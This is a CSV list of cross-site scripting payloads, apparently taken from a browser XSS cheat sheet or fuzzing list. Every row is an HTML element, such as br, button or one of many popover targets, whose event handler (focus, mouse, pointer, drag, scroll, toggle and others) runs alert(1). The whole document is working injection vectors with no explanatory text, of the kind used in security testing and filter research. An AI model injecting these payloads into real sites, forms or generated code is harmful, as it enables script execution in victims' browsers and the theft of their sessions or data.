,,"<br oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<br oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<br ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</br>",,
,,<br onfocus=alert(1) autofocus tabindex=1>,,
,,<br onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</br><input value=clickme>,,
,,"<br onkeydown=""alert(1)"" contenteditable style=display:block>test</br>",,
,,"<br onkeypress=""alert(1)"" contenteditable style=display:block>test</br>",,
,,"<br onkeyup=""alert(1)"" contenteditable style=display:block>test</br>",,
,,"<br onmousedown=""alert(1)"" style=display:block>test</br>",,
,,"<br onmouseenter=""alert(1)"" style=display:block>test</br>",,
,,"<br onmouseleave=""alert(1)"" style=display:block>test</br>",,
,,"<br onmousemove=""alert(1)"" style=display:block>test</br>",,
,,"<br onmouseout=""alert(1)"" style=display:block>test</br>",,
,,"<br onmouseover=""alert(1)"" style=display:block>test</br>",,
,,"<br onmouseup=""alert(1)"" style=display:block>test</br>",,
,,<br onmousewheel=alert(1) style=display:block>requires scrolling,,
,,"<br onpaste=""alert(1)"" contenteditable>test</br>",,
,,<br onpointercancel=alert(1)>XSS</br>,,
,,<br onpointerdown=alert(1) style=display:block>XSS</br>,,
,,<br onpointerenter=alert(1) style=display:block>XSS</br>,,
,,<br onpointerleave=alert(1) style=display:block>XSS</br>,,
,,<br onpointermove=alert(1) style=display:block>XSS</br>,,
,,<br onpointerout=alert(1) style=display:block>XSS</br>,,
,,<br onpointerover=alert(1) style=display:block>XSS</br>,,
,,<br onpointerrawupdate=alert(1) style=display:block>XSS</br>,,
,,<br onpointerup=alert(1) style=display:block>XSS</br>,,
,,"<br onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></br>",,
,,<br onwebkitmouseforcechanged=alert(1)>XSS</br>,,
,,<br onwebkitmouseforcedown=alert(1)>XSS</br>,,
,,<br onwebkitmouseforceup=alert(1)>XSS</br>,,
,,<br onwebkitmouseforcewillbegin=alert(1)>XSS</br>,,
,,<br onwebkitwillrevealbottom=alert(1)>XSS</br>,,
,,<button autofocus onfocus=alert(1)>test</button>,,
,,<button autofocus onfocusin=alert(1)>test</button>,,
,,<button contenteditable onbeforeinput=alert(1)>test,,
,,"<button draggable=""true"" ondrag=""alert(1)"" style=display:block>test</button>",,
,,"<button draggable=""true"" ondragend=""alert(1)"" style=display:block>test</button>",,
,,"<button draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</button>",,
,,"<button draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</button>",,
,,"<button draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</button>",,
,,"<button draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</button>",,
,,"<button id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></button>",,
,,<button onafterscriptexecute=alert(1)><script>1</script>,,
,,"<button onbeforecopy=""alert(1)"" contenteditable>test</button>",,
,,"<button onbeforecut=""alert(1)"" contenteditable>test</button>",,
,,<button onbeforescriptexecute=alert(1)><script>1</script>,,
,,<button onblur=alert(1) id=x tabindex=1 style=display:block>test</button><input value=clickme>,,
,,"<button onclick=""alert(1)"" style=display:block>test</button>",,
,,"<button oncontextmenu=""alert(1)"" style=display:block>test</button>",,
,,"<button oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<button oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<button ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</button>",,
,,<button onfocus=alert(1) autofocus tabindex=1>,,
,,<button onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</button><input value=clickme>,,
,,"<button onkeydown=""alert(1)"" contenteditable style=display:block>test</button>",,
,,"<button onkeypress=""alert(1)"" contenteditable style=display:block>test</button>",,
,,"<button onkeyup=""alert(1)"" contenteditable style=display:block>test</button>",,
,,"<button onmousedown=""alert(1)"" style=display:block>test</button>",,
,,"<button onmouseenter=""alert(1)"" style=display:block>test</button>",,
,,"<button onmouseleave=""alert(1)"" style=display:block>test</button>",,
,,"<button onmousemove=""alert(1)"" style=display:block>test</button>",,
,,"<button onmouseout=""alert(1)"" style=display:block>test</button>",,
,,"<button onmouseover=""alert(1)"" style=display:block>test</button>",,
,,"<button onmouseup=""alert(1)"" style=display:block>test</button>",,
,,<button onmousewheel=alert(1) style=display:block>requires scrolling,,
,,"<button onpaste=""alert(1)"" contenteditable>test</button>",,
,,<button onpointercancel=alert(1)>XSS</button>,,
,,<button onpointerdown=alert(1) style=display:block>XSS</button>,,
,,<button onpointerenter=alert(1) style=display:block>XSS</button>,,
,,<button onpointerleave=alert(1) style=display:block>XSS</button>,,
,,<button onpointermove=alert(1) style=display:block>XSS</button>,,
,,<button onpointerout=alert(1) style=display:block>XSS</button>,,
,,<button onpointerover=alert(1) style=display:block>XSS</button>,,
,,<button onpointerrawupdate=alert(1) style=display:block>XSS</button>,,
,,<button onpointerup=alert(1) style=display:block>XSS</button>,,
,,"<button onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></button>",,
,,<button onwebkitmouseforcechanged=alert(1)>XSS</button>,,
,,<button onwebkitmouseforcedown=alert(1)>XSS</button>,,
,,<button onwebkitmouseforceup=alert(1)>XSS</button>,,
,,<button onwebkitmouseforcewillbegin=alert(1)>XSS</button>,,
,,<button onwebkitwillrevealbottom=alert(1)>XSS</button>,,
,,<button popovertarget=x>Click me</button><a onbeforetoggle=alert(1) popover id=x>XSS</a>,,
,,<button popovertarget=x>Click me</button><a ontoggle=alert(1) popover id=x>XSS</a>,,
,,<button popovertarget=x>Click me</button><a2 onbeforetoggle=alert(1) popover id=x>XSS</a2>,,
,,<button popovertarget=x>Click me</button><a2 ontoggle=alert(1) popover id=x>XSS</a2>,,
,,<button popovertarget=x>Click me</button><abbr onbeforetoggle=alert(1) popover id=x>XSS</abbr>,,
,,<button popovertarget=x>Click me</button><abbr ontoggle=alert(1) popover id=x>XSS</abbr>,,
,,<button popovertarget=x>Click me</button><acronym onbeforetoggle=alert(1) popover id=x>XSS</acronym>,,
,,<button popovertarget=x>Click me</button><acronym ontoggle=alert(1) popover id=x>XSS</acronym>,,
,,<button popovertarget=x>Click me</button><address onbeforetoggle=alert(1) popover id=x>XSS</address>,,
,,<button popovertarget=x>Click me</button><address ontoggle=alert(1) popover id=x>XSS</address>,,
,,<button popovertarget=x>Click me</button><animate onbeforetoggle=alert(1) popover id=x>XSS</animate>,,
,,<button popovertarget=x>Click me</button><animate ontoggle=alert(1) popover id=x>XSS</animate>,,
,,<button popovertarget=x>Click me</button><animatemotion onbeforetoggle=alert(1) popover id=x>XSS</animatemotion>,,
,,<button popovertarget=x>Click me</button><animatemotion ontoggle=alert(1) popover id=x>XSS</animatemotion>,,
,,<button popovertarget=x>Click me</button><animatetransform onbeforetoggle=alert(1) popover id=x>XSS</animatetransform>,,
,,<button popovertarget=x>Click me</button><animatetransform ontoggle=alert(1) popover id=x>XSS</animatetransform>,,
,,<button popovertarget=x>Click me</button><applet onbeforetoggle=alert(1) popover id=x>XSS</applet>,,
,,<button popovertarget=x>Click me</button><applet ontoggle=alert(1) popover id=x>XSS</applet>,,
,,<button popovertarget=x>Click me</button><area onbeforetoggle=alert(1) popover id=x>XSS</area>,,
,,<button popovertarget=x>Click me</button><area ontoggle=alert(1) popover id=x>XSS</area>,,
,,<button popovertarget=x>Click me</button><article onbeforetoggle=alert(1) popover id=x>XSS</article>,,
,,<button popovertarget=x>Click me</button><article ontoggle=alert(1) popover id=x>XSS</article>,,
,,<button popovertarget=x>Click me</button><aside onbeforetoggle=alert(1) popover id=x>XSS</aside>,,
,,<button popovertarget=x>Click me</button><aside ontoggle=alert(1) popover id=x>XSS</aside>,,
,,<button popovertarget=x>Click me</button><audio onbeforetoggle=alert(1) popover id=x>XSS</audio>,,
,,<button popovertarget=x>Click me</button><audio ontoggle=alert(1) popover id=x>XSS</audio>,,
,,<button popovertarget=x>Click me</button><audio2 onbeforetoggle=alert(1) popover id=x>XSS</audio2>,,
,,<button popovertarget=x>Click me</button><audio2 ontoggle=alert(1) popover id=x>XSS</audio2>,,
,,<button popovertarget=x>Click me</button><b onbeforetoggle=alert(1) popover id=x>XSS</b>,,
,,<button popovertarget=x>Click me</button><b ontoggle=alert(1) popover id=x>XSS</b>,,
,,<button popovertarget=x>Click me</button><bdi onbeforetoggle=alert(1) popover id=x>XSS</bdi>,,
,,<button popovertarget=x>Click me</button><bdi ontoggle=alert(1) popover id=x>XSS</bdi>,,
,,<button popovertarget=x>Click me</button><bdo onbeforetoggle=alert(1) popover id=x>XSS</bdo>,,
,,<button popovertarget=x>Click me</button><bdo ontoggle=alert(1) popover id=x>XSS</bdo>,,
,,<button popovertarget=x>Click me</button><big onbeforetoggle=alert(1) popover id=x>XSS</big>,,
,,<button popovertarget=x>Click me</button><big ontoggle=alert(1) popover id=x>XSS</big>,,
,,<button popovertarget=x>Click me</button><blink onbeforetoggle=alert(1) popover id=x>XSS</blink>,,
,,<button popovertarget=x>Click me</button><blink ontoggle=alert(1) popover id=x>XSS</blink>,,
,,<button popovertarget=x>Click me</button><blockquote onbeforetoggle=alert(1) popover id=x>XSS</blockquote>,,
,,<button popovertarget=x>Click me</button><blockquote ontoggle=alert(1) popover id=x>XSS</blockquote>,,
,,<button popovertarget=x>Click me</button><body onbeforetoggle=alert(1) popover id=x>XSS</body>,,
,,<button popovertarget=x>Click me</button><body ontoggle=alert(1) popover id=x>XSS</body>,,
,,<button popovertarget=x>Click me</button><br onbeforetoggle=alert(1) popover id=x>XSS</br>,,
,,<button popovertarget=x>Click me</button><br ontoggle=alert(1) popover id=x>XSS</br>,,
,,<button popovertarget=x>Click me</button><button onbeforetoggle=alert(1) popover id=x>XSS</button>,,
,,<button popovertarget=x>Click me</button><button ontoggle=alert(1) popover id=x>XSS</button>,,
,,<button popovertarget=x>Click me</button><canvas onbeforetoggle=alert(1) popover id=x>XSS</canvas>,,
,,<button popovertarget=x>Click me</button><canvas ontoggle=alert(1) popover id=x>XSS</canvas>,,
,,<button popovertarget=x>Click me</button><caption onbeforetoggle=alert(1) popover id=x>XSS</caption>,,
,,<button popovertarget=x>Click me</button><caption ontoggle=alert(1) popover id=x>XSS</caption>,,
,,<button popovertarget=x>Click me</button><center onbeforetoggle=alert(1) popover id=x>XSS</center>,,
,,<button popovertarget=x>Click me</button><center ontoggle=alert(1) popover id=x>XSS</center>,,
,,<button popovertarget=x>Click me</button><cite onbeforetoggle=alert(1) popover id=x>XSS</cite>,,
,,<button popovertarget=x>Click me</button><cite ontoggle=alert(1) popover id=x>XSS</cite>,,
,,<button popovertarget=x>Click me</button><code onbeforetoggle=alert(1) popover id=x>XSS</code>,,
,,<button popovertarget=x>Click me</button><code ontoggle=alert(1) popover id=x>XSS</code>,,
,,<button popovertarget=x>Click me</button><col onbeforetoggle=alert(1) popover id=x>XSS</col>,,
,,<button popovertarget=x>Click me</button><col ontoggle=alert(1) popover id=x>XSS</col>,,
,,<button popovertarget=x>Click me</button><colgroup onbeforetoggle=alert(1) popover id=x>XSS</colgroup>,,
,,<button popovertarget=x>Click me</button><colgroup ontoggle=alert(1) popover id=x>XSS</colgroup>,,
,,<button popovertarget=x>Click me</button><command onbeforetoggle=alert(1) popover id=x>XSS</command>,,
,,<button popovertarget=x>Click me</button><command ontoggle=alert(1) popover id=x>XSS</command>,,
,,<button popovertarget=x>Click me</button><content onbeforetoggle=alert(1) popover id=x>XSS</content>,,
,,<button popovertarget=x>Click me</button><content ontoggle=alert(1) popover id=x>XSS</content>,,
,,<button popovertarget=x>Click me</button><custom tags onbeforetoggle=alert(1) popover id=x>XSS</custom tags>,,
,,<button popovertarget=x>Click me</button><custom tags ontoggle=alert(1) popover id=x>XSS</custom tags>,,
,,<button popovertarget=x>Click me</button><data onbeforetoggle=alert(1) popover id=x>XSS</data>,,
,,<button popovertarget=x>Click me</button><data ontoggle=alert(1) popover id=x>XSS</data>,,
,,<button popovertarget=x>Click me</button><datalist onbeforetoggle=alert(1) popover id=x>XSS</datalist>,,
,,<button popovertarget=x>Click me</button><datalist ontoggle=alert(1) popover id=x>XSS</datalist>,,
,,<button popovertarget=x>Click me</button><dd onbeforetoggle=alert(1) popover id=x>XSS</dd>,,
,,<button popovertarget=x>Click me</button><dd ontoggle=alert(1) popover id=x>XSS</dd>,,
,,<button popovertarget=x>Click me</button><del onbeforetoggle=alert(1) popover id=x>XSS</del>,,
,,<button popovertarget=x>Click me</button><del ontoggle=alert(1) popover id=x>XSS</del>,,
,,<button popovertarget=x>Click me</button><details onbeforetoggle=alert(1) popover id=x>XSS</details>,,
,,<button popovertarget=x>Click me</button><details ontoggle=alert(1) popover id=x>XSS</details>,,
,,<button popovertarget=x>Click me</button><dfn onbeforetoggle=alert(1) popover id=x>XSS</dfn>,,
,,<button popovertarget=x>Click me</button><dfn ontoggle=alert(1) popover id=x>XSS</dfn>,,
,,<button popovertarget=x>Click me</button><dialog onbeforetoggle=alert(1) popover id=x>XSS</dialog>,,
,,<button popovertarget=x>Click me</button><dialog ontoggle=alert(1) popover id=x>XSS</dialog>,,
,,<button popovertarget=x>Click me</button><dir onbeforetoggle=alert(1) popover id=x>XSS</dir>,,
,,<button popovertarget=x>Click me</button><dir ontoggle=alert(1) popover id=x>XSS</dir>,,
,,<button popovertarget=x>Click me</button><div onbeforetoggle=alert(1) popover id=x>XSS</div>,,
,,<button popovertarget=x>Click me</button><div ontoggle=alert(1) popover id=x>XSS</div>,,
,,<button popovertarget=x>Click me</button><dl onbeforetoggle=alert(1) popover id=x>XSS</dl>,,
,,<button popovertarget=x>Click me</button><dl ontoggle=alert(1) popover id=x>XSS</dl>,,
,,<button popovertarget=x>Click me</button><dt onbeforetoggle=alert(1) popover id=x>XSS</dt>,,
,,<button popovertarget=x>Click me</button><dt ontoggle=alert(1) popover id=x>XSS</dt>,,
,,<button popovertarget=x>Click me</button><element onbeforetoggle=alert(1) popover id=x>XSS</element>,,
,,<button popovertarget=x>Click me</button><element ontoggle=alert(1) popover id=x>XSS</element>,,
,,<button popovertarget=x>Click me</button><em onbeforetoggle=alert(1) popover id=x>XSS</em>,,
,,<button popovertarget=x>Click me</button><em ontoggle=alert(1) popover id=x>XSS</em>,,
,,<button popovertarget=x>Click me</button><embed onbeforetoggle=alert(1) popover id=x>XSS</embed>,,
,,<button popovertarget=x>Click me</button><embed ontoggle=alert(1) popover id=x>XSS</embed>,,
,,<button popovertarget=x>Click me</button><fieldset onbeforetoggle=alert(1) popover id=x>XSS</fieldset>,,
,,<button popovertarget=x>Click me</button><fieldset ontoggle=alert(1) popover id=x>XSS</fieldset>,,
,,<button popovertarget=x>Click me</button><figcaption onbeforetoggle=alert(1) popover id=x>XSS</figcaption>,,
,,<button popovertarget=x>Click me</button><figcaption ontoggle=alert(1) popover id=x>XSS</figcaption>,,
,,<button popovertarget=x>Click me</button><figure onbeforetoggle=alert(1) popover id=x>XSS</figure>,,
,,<button popovertarget=x>Click me</button><figure ontoggle=alert(1) popover id=x>XSS</figure>,,
,,<button popovertarget=x>Click me</button><font onbeforetoggle=alert(1) popover id=x>XSS</font>,,
,,<button popovertarget=x>Click me</button><font ontoggle=alert(1) popover id=x>XSS</font>,,
,,<button popovertarget=x>Click me</button><footer onbeforetoggle=alert(1) popover id=x>XSS</footer>,,
,,<button popovertarget=x>Click me</button><footer ontoggle=alert(1) popover id=x>XSS</footer>,,
,,<button popovertarget=x>Click me</button><form onbeforetoggle=alert(1) popover id=x>XSS</form>,,
,,<button popovertarget=x>Click me</button><form ontoggle=alert(1) popover id=x>XSS</form>,,
,,<button popovertarget=x>Click me</button><frame onbeforetoggle=alert(1) popover id=x>XSS</frame>,,
,,<button popovertarget=x>Click me</button><frame ontoggle=alert(1) popover id=x>XSS</frame>,,
,,<button popovertarget=x>Click me</button><frameset onbeforetoggle=alert(1) popover id=x>XSS</frameset>,,
,,<button popovertarget=x>Click me</button><frameset ontoggle=alert(1) popover id=x>XSS</frameset>,,
,,<button popovertarget=x>Click me</button><h1 onbeforetoggle=alert(1) popover id=x>XSS</h1>,,
,,<button popovertarget=x>Click me</button><h1 ontoggle=alert(1) popover id=x>XSS</h1>,,
,,<button popovertarget=x>Click me</button><head onbeforetoggle=alert(1) popover id=x>XSS</head>,,
,,<button popovertarget=x>Click me</button><head ontoggle=alert(1) popover id=x>XSS</head>,,
,,<button popovertarget=x>Click me</button><header onbeforetoggle=alert(1) popover id=x>XSS</header>,,
,,<button popovertarget=x>Click me</button><header ontoggle=alert(1) popover id=x>XSS</header>,,
,,<button popovertarget=x>Click me</button><hgroup onbeforetoggle=alert(1) popover id=x>XSS</hgroup>,,
,,<button popovertarget=x>Click me</button><hgroup ontoggle=alert(1) popover id=x>XSS</hgroup>,,
,,<button popovertarget=x>Click me</button><hr onbeforetoggle=alert(1) popover id=x>XSS</hr>,,
,,<button popovertarget=x>Click me</button><hr ontoggle=alert(1) popover id=x>XSS</hr>,,
,,<button popovertarget=x>Click me</button><html onbeforetoggle=alert(1) popover id=x>XSS</html>,,
,,<button popovertarget=x>Click me</button><html ontoggle=alert(1) popover id=x>XSS</html>,,
,,<button popovertarget=x>Click me</button><i onbeforetoggle=alert(1) popover id=x>XSS</i>,,
,,<button popovertarget=x>Click me</button><i ontoggle=alert(1) popover id=x>XSS</i>,,
,,<button popovertarget=x>Click me</button><iframe onbeforetoggle=alert(1) popover id=x>XSS</iframe>,,
,,<button popovertarget=x>Click me</button><iframe ontoggle=alert(1) popover id=x>XSS</iframe>,,
,,<button popovertarget=x>Click me</button><iframe2 onbeforetoggle=alert(1) popover id=x>XSS</iframe2>,,
,,<button popovertarget=x>Click me</button><iframe2 ontoggle=alert(1) popover id=x>XSS</iframe2>,,
,,<button popovertarget=x>Click me</button><image onbeforetoggle=alert(1) popover id=x>XSS</image>,,
,,<button popovertarget=x>Click me</button><image ontoggle=alert(1) popover id=x>XSS</image>,,
,,<button popovertarget=x>Click me</button><image2 onbeforetoggle=alert(1) popover id=x>XSS</image2>,,
,,<button popovertarget=x>Click me</button><image2 ontoggle=alert(1) popover id=x>XSS</image2>,,
,,<button popovertarget=x>Click me</button><image3 onbeforetoggle=alert(1) popover id=x>XSS</image3>,,
,,<button popovertarget=x>Click me</button><image3 ontoggle=alert(1) popover id=x>XSS</image3>,,
,,<button popovertarget=x>Click me</button><img onbeforetoggle=alert(1) popover id=x>XSS</img>,,
,,<button popovertarget=x>Click me</button><img ontoggle=alert(1) popover id=x>XSS</img>,,
,,<button popovertarget=x>Click me</button><img2 onbeforetoggle=alert(1) popover id=x>XSS</img2>,,
,,<button popovertarget=x>Click me</button><img2 ontoggle=alert(1) popover id=x>XSS</img2>,,
,,<button popovertarget=x>Click me</button><input onbeforetoggle=alert(1) popover id=x>XSS</input>,,
,,<button popovertarget=x>Click me</button><input ontoggle=alert(1) popover id=x>XSS</input>,,
,,<button popovertarget=x>Click me</button><input2 onbeforetoggle=alert(1) popover id=x>XSS</input2>,,
,,<button popovertarget=x>Click me</button><input2 ontoggle=alert(1) popover id=x>XSS</input2>,,
,,<button popovertarget=x>Click me</button><input3 onbeforetoggle=alert(1) popover id=x>XSS</input3>,,
,,<button popovertarget=x>Click me</button><input3 ontoggle=alert(1) popover id=x>XSS</input3>,,
,,<button popovertarget=x>Click me</button><input4 onbeforetoggle=alert(1) popover id=x>XSS</input4>,,
,,<button popovertarget=x>Click me</button><input4 ontoggle=alert(1) popover id=x>XSS</input4>,,
,,<button popovertarget=x>Click me</button><ins onbeforetoggle=alert(1) popover id=x>XSS</ins>,,
,,<button popovertarget=x>Click me</button><ins ontoggle=alert(1) popover id=x>XSS</ins>,,
,,<button popovertarget=x>Click me</button><kbd onbeforetoggle=alert(1) popover id=x>XSS</kbd>,,
,,<button popovertarget=x>Click me</button><kbd ontoggle=alert(1) popover id=x>XSS</kbd>,,
,,<button popovertarget=x>Click me</button><keygen onbeforetoggle=alert(1) popover id=x>XSS</keygen>,,
,,<button popovertarget=x>Click me</button><keygen ontoggle=alert(1) popover id=x>XSS</keygen>,,
,,<button popovertarget=x>Click me</button><label onbeforetoggle=alert(1) popover id=x>XSS</label>,,
,,<button popovertarget=x>Click me</button><label ontoggle=alert(1) popover id=x>XSS</label>,,
,,<button popovertarget=x>Click me</button><legend onbeforetoggle=alert(1) popover id=x>XSS</legend>,,
,,<button popovertarget=x>Click me</button><legend ontoggle=alert(1) popover id=x>XSS</legend>,,
,,<button popovertarget=x>Click me</button><li onbeforetoggle=alert(1) popover id=x>XSS</li>,,
,,<button popovertarget=x>Click me</button><li ontoggle=alert(1) popover id=x>XSS</li>,,
,,<button popovertarget=x>Click me</button><link onbeforetoggle=alert(1) popover id=x>XSS</link>,,
,,<button popovertarget=x>Click me</button><link ontoggle=alert(1) popover id=x>XSS</link>,,
,,<button popovertarget=x>Click me</button><listing onbeforetoggle=alert(1) popover id=x>XSS</listing>,,
,,<button popovertarget=x>Click me</button><listing ontoggle=alert(1) popover id=x>XSS</listing>,,
,,<button popovertarget=x>Click me</button><main onbeforetoggle=alert(1) popover id=x>XSS</main>,,
,,<button popovertarget=x>Click me</button><main ontoggle=alert(1) popover id=x>XSS</main>,,
,,<button popovertarget=x>Click me</button><map onbeforetoggle=alert(1) popover id=x>XSS</map>,,
,,<button popovertarget=x>Click me</button><map ontoggle=alert(1) popover id=x>XSS</map>,,
,,<button popovertarget=x>Click me</button><mark onbeforetoggle=alert(1) popover id=x>XSS</mark>,,
,,<button popovertarget=x>Click me</button><mark ontoggle=alert(1) popover id=x>XSS</mark>,,
,,<button popovertarget=x>Click me</button><marquee onbeforetoggle=alert(1) popover id=x>XSS</marquee>,,
,,<button popovertarget=x>Click me</button><marquee ontoggle=alert(1) popover id=x>XSS</marquee>,,
,,<button popovertarget=x>Click me</button><menu onbeforetoggle=alert(1) popover id=x>XSS</menu>,,
,,<button popovertarget=x>Click me</button><menu ontoggle=alert(1) popover id=x>XSS</menu>,,
,,<button popovertarget=x>Click me</button><menuitem onbeforetoggle=alert(1) popover id=x>XSS</menuitem>,,
,,<button popovertarget=x>Click me</button><menuitem ontoggle=alert(1) popover id=x>XSS</menuitem>,,
,,<button popovertarget=x>Click me</button><meta onbeforetoggle=alert(1) popover id=x>XSS</meta>,,
,,<button popovertarget=x>Click me</button><meta ontoggle=alert(1) popover id=x>XSS</meta>,,
,,<button popovertarget=x>Click me</button><meter onbeforetoggle=alert(1) popover id=x>XSS</meter>,,
,,<button popovertarget=x>Click me</button><meter ontoggle=alert(1) popover id=x>XSS</meter>,,
,,<button popovertarget=x>Click me</button><multicol onbeforetoggle=alert(1) popover id=x>XSS</multicol>,,
,,<button popovertarget=x>Click me</button><multicol ontoggle=alert(1) popover id=x>XSS</multicol>,,
,,<button popovertarget=x>Click me</button><nav onbeforetoggle=alert(1) popover id=x>XSS</nav>,,
,,<button popovertarget=x>Click me</button><nav ontoggle=alert(1) popover id=x>XSS</nav>,,
,,<button popovertarget=x>Click me</button><nextid onbeforetoggle=alert(1) popover id=x>XSS</nextid>,,
,,<button popovertarget=x>Click me</button><nextid ontoggle=alert(1) popover id=x>XSS</nextid>,,
,,<button popovertarget=x>Click me</button><nobr onbeforetoggle=alert(1) popover id=x>XSS</nobr>,,
,,<button popovertarget=x>Click me</button><nobr ontoggle=alert(1) popover id=x>XSS</nobr>,,
,,<button popovertarget=x>Click me</button><noembed onbeforetoggle=alert(1) popover id=x>XSS</noembed>,,
,,<button popovertarget=x>Click me</button><noembed ontoggle=alert(1) popover id=x>XSS</noembed>,,
,,<button popovertarget=x>Click me</button><noframes onbeforetoggle=alert(1) popover id=x>XSS</noframes>,,
,,<button popovertarget=x>Click me</button><noframes ontoggle=alert(1) popover id=x>XSS</noframes>,,
,,<button popovertarget=x>Click me</button><noscript onbeforetoggle=alert(1) popover id=x>XSS</noscript>,,
,,<button popovertarget=x>Click me</button><noscript ontoggle=alert(1) popover id=x>XSS</noscript>,,
,,<button popovertarget=x>Click me</button><object onbeforetoggle=alert(1) popover id=x>XSS</object>,,
,,<button popovertarget=x>Click me</button><object ontoggle=alert(1) popover id=x>XSS</object>,,
,,<button popovertarget=x>Click me</button><ol onbeforetoggle=alert(1) popover id=x>XSS</ol>,,
,,<button popovertarget=x>Click me</button><ol ontoggle=alert(1) popover id=x>XSS</ol>,,
,,<button popovertarget=x>Click me</button><optgroup onbeforetoggle=alert(1) popover id=x>XSS</optgroup>,,
,,<button popovertarget=x>Click me</button><optgroup ontoggle=alert(1) popover id=x>XSS</optgroup>,,
,,<button popovertarget=x>Click me</button><option onbeforetoggle=alert(1) popover id=x>XSS</option>,,
,,<button popovertarget=x>Click me</button><option ontoggle=alert(1) popover id=x>XSS</option>,,
,,<button popovertarget=x>Click me</button><output onbeforetoggle=alert(1) popover id=x>XSS</output>,,
,,<button popovertarget=x>Click me</button><output ontoggle=alert(1) popover id=x>XSS</output>,,
,,<button popovertarget=x>Click me</button><p onbeforetoggle=alert(1) popover id=x>XSS</p>,,
,,<button popovertarget=x>Click me</button><p ontoggle=alert(1) popover id=x>XSS</p>,,
,,<button popovertarget=x>Click me</button><param onbeforetoggle=alert(1) popover id=x>XSS</param>,,
,,<button popovertarget=x>Click me</button><param ontoggle=alert(1) popover id=x>XSS</param>,,
,,<button popovertarget=x>Click me</button><picture onbeforetoggle=alert(1) popover id=x>XSS</picture>,,
,,<button popovertarget=x>Click me</button><picture ontoggle=alert(1) popover id=x>XSS</picture>,,
,,<button popovertarget=x>Click me</button><plaintext onbeforetoggle=alert(1) popover id=x>XSS</plaintext>,,
,,<button popovertarget=x>Click me</button><plaintext ontoggle=alert(1) popover id=x>XSS</plaintext>,,
,,<button popovertarget=x>Click me</button><pre onbeforetoggle=alert(1) popover id=x>XSS</pre>,,
,,<button popovertarget=x>Click me</button><pre ontoggle=alert(1) popover id=x>XSS</pre>,,
,,<button popovertarget=x>Click me</button><progress onbeforetoggle=alert(1) popover id=x>XSS</progress>,,
,,<button popovertarget=x>Click me</button><progress ontoggle=alert(1) popover id=x>XSS</progress>,,
,,<button popovertarget=x>Click me</button><q onbeforetoggle=alert(1) popover id=x>XSS</q>,,
,,<button popovertarget=x>Click me</button><q ontoggle=alert(1) popover id=x>XSS</q>,,
,,<button popovertarget=x>Click me</button><rb onbeforetoggle=alert(1) popover id=x>XSS</rb>,,
,,<button popovertarget=x>Click me</button><rb ontoggle=alert(1) popover id=x>XSS</rb>,,
,,<button popovertarget=x>Click me</button><rp onbeforetoggle=alert(1) popover id=x>XSS</rp>,,
,,<button popovertarget=x>Click me</button><rp ontoggle=alert(1) popover id=x>XSS</rp>,,
,,<button popovertarget=x>Click me</button><rt onbeforetoggle=alert(1) popover id=x>XSS</rt>,,
,,<button popovertarget=x>Click me</button><rt ontoggle=alert(1) popover id=x>XSS</rt>,,
,,<button popovertarget=x>Click me</button><rtc onbeforetoggle=alert(1) popover id=x>XSS</rtc>,,
,,<button popovertarget=x>Click me</button><rtc ontoggle=alert(1) popover id=x>XSS</rtc>,,
,,<button popovertarget=x>Click me</button><ruby onbeforetoggle=alert(1) popover id=x>XSS</ruby>,,
,,<button popovertarget=x>Click me</button><ruby ontoggle=alert(1) popover id=x>XSS</ruby>,,
